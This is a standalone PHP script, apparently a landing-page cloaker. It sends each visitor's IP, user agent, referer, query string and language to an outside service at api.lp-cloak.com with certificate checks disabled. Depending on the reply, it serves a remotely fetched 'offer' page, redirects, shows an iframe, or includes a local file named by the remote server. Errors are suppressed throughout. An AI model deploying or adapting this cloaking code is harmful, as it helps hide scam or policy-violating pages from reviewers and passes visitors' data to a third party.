<?php
error_reporting(0);
mb_internal_encoding('UTF-8');


$ip_address = $_SERVER['REMOTE_ADDR'];
$ip_headers = [
    'HTTP_CLIENT_IP',
    'HTTP_X_FORWARDED_FOR',
    'HTTP_CF_CONNECTING_IP',
    'HTTP_FORWARDED_FOR',
    'HTTP_X_COMING_FROM',
    'HTTP_COMING_FROM',
    'HTTP_FORWARDED_FOR_IP',
    'HTTP_X_REAL_IP'
];


if (!empty($ip_headers)) {
    foreach ($ip_headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip_address = trim($_SERVER[$header]);
            break;
        }
    }
}


$request_data = [
    'company_id' => '0312189f-2b43-4ceb-8c4a-ac8ab6bf43ce',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'referer' => !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '',
    'query' => !empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '',
    'lang' => !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '',
    'ip_address' => $ip_address
];


if (function_exists('curl_version')) {

    $request_data = http_build_query($request_data);
    $ch = curl_init('https://api.lp-cloak.com/api/verifies');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_SSL_VERIFYPEER => FALSE,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_POSTFIELDS => $request_data
    ]);


    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);


    if (!empty($info) && $info['http_code'] == 200) {
        $body = json_decode($result, TRUE);

        $сontext_options = ['ssl' => ['verify_peer' => FALSE, 'verify_peer_name' => FALSE], 'http' => ['header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']]];

        if ($body['type'] == 'load') {
            if (filter_var($body['url'], FILTER_VALIDATE_URL)) {
                echo str_replace('<head>', '<head><base href="' . $body['url'] . '" />', file_get_contents($body['url'], FALSE, stream_context_create($сontext_options)));
            } elseif (file_exists($body['url'])) {
                if (pathinfo($body['url'], PATHINFO_EXTENSION) == 'html') {
                    echo file_get_contents($body['url'], FALSE, stream_context_create($сontext_options));
                } else {
                    require_once($body['url']);
                }
            } else {
                exit('Offer Page Not Found.');
            }
        }


        if ($body['type'] == 'redirect') {
            header('Location: ' . $body['url'], TRUE, 302);
            exit(0);
        }

        if ($body['type'] == 'iframe') {
            echo '<iframe src="' . $body['url'] . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
        }
    } else {
        exit('Something went wrong. Pls contact with support');
    }
} else {
    exit('cURL is not supported on the hosting.');
}
